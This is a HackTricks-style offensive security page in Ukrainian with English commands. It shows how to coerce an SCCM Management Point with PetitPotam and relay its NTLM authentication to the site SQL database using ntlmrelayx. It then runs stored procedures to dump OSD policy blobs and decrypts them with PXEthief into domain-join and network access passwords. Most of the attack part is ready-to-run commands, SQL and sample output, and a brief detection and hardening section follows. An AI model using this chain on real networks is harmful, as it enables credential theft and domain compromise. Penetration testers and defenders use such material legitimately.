# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Шляхом примушення **System Center Configuration Manager (SCCM) Management Point (MP)** автентифікуватися через SMB/RPC та **пересилаючи** цей NTLM обліковий запис машини до **бази даних сайту (MSSQL)** ви отримуєте права `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ці ролі дозволяють вам викликати набір збережених процедур, які відкривають **блоки політики розгортання операційної системи (OSD)** (облікові дані облікового запису доступу до мережі, змінні послідовності завдань тощо). Блоки закодовані в шістнадцятковому вигляді/зашифровані, але можуть бути декодовані та розшифровані за допомогою **PXEthief**, що дає в результаті відкриті секрети.

Високорівневий ланцюг:
1. Виявлення MP та бази даних сайту ↦ неавтентифікована HTTP точка `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Запустіть `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Примусьте MP за допомогою **PetitPotam**, PrinterBug, DFSCoerce тощо.
4. Через SOCKS проксі підключіться за допомогою `mssqlclient.py -windows-auth` як пересланий обліковий запис **<DOMAIN>\\<MP-host>$**.
5. Виконайте:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (або `MP_GetPolicyBodyAfterAuthorization`)
6. Видаліть `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Секрети, такі як `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` тощо, відновлюються без взаємодії з PXE або клієнтами.

---

## 1. Перерахування неавтентифікованих MP точок
Розширення ISAPI MP **GetAuth.dll** відкриває кілька параметрів, які не вимагають автентифікації (якщо сайт не є лише PKI):

| Параметр | Призначення |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Повертає публічний ключ сертифіката підпису сайту + GUIDs пристроїв *x86* / *x64* **Усі невідомі комп'ютери**. |
| `MPLIST` | Перераховує кожну точку управління на сайті. |
| `SITESIGNCERT` | Повертає сертифікат підпису основного сайту (ідентифікує сервер сайту без LDAP). |

Отримайте GUIDs, які будуть діяти як **clientID** для подальших запитів до бази даних:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Переслати обліковий запис машини MP до MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Коли примус спрацьовує, ви повинні побачити щось на зразок:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Визначте OSD політики через збережені процедури
Підключіться через SOCKS проксі (порт 1080 за замовчуванням):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Перейдіть до бази даних **CM_<SiteCode>** (використовуйте 3-значний код сайту, наприклад, `CM_001`).

### 3.1  Знайти GUID невідомих комп'ютерів (необов'язково)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Список призначених політик
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Кожен рядок містить `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Зосередьтеся на політиках:
* **NAAConfig**  – облікові дані облікового запису мережевого доступу
* **TS_Sequence** – змінні послідовності завдань (OSDJoinAccount/Password)
* **CollectionSettings** – може містити облікові записи для виконання

### 3.3  Отримати повне тіло
Якщо у вас вже є `PolicyID` та `PolicyVersion`, ви можете пропустити вимогу clientID, використовуючи:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ВАЖЛИВО: У SSMS збільшіть “Максимальна кількість символів, що отримуються” (>65535), інакше blob буде обрізано.

---

## 4. Декодуйте та розшифруйте blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Приклад відновлених секретів:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Відповідні ролі та процедури SQL
Після реле логін відображається на:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Ці ролі відкривають десятки дозволів EXEC, ключові з яких, що використовуються в цій атаці, це:

| Збережена процедура | Призначення |
|---------------------|------------|
| `MP_GetMachinePolicyAssignments` | Перелік політик, застосованих до `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Повертає повне тіло політики. |
| `MP_GetListOfMPsInSiteOSD` | Повертається шляхом `MPKEYINFORMATIONMEDIA`. |

Ви можете переглянути повний список за допомогою:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Виявлення та зміцнення
1. **Моніторинг входів MP** – будь-який комп'ютерний обліковий запис MP, що входить з IP, який не є його хостом ≈ реле.
2. Увімкніть **Розширений захист для аутентифікації (EPA)** у базі даних сайту (`PREVENT-14`).
3. Вимкніть невикористовуваний NTLM, примусьте підписування SMB, обмежте RPC (
ті ж заходи, що використовуються проти `PetitPotam`/`PrinterBug`).
4. Зміцніть комунікацію MP ↔ DB за допомогою IPSec / взаємного TLS.

---

## Дивіться також
* Основи реле NTLM:
{{#ref}}
../ntlm/README.md
{{#endref}}

* Зловживання MSSQL та пост-експлуатація:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Посилання
- [Я б хотів поговорити з вашим менеджером: Крадіжка секретів за допомогою реле точок управління](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Менеджер неправильних налаштувань – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
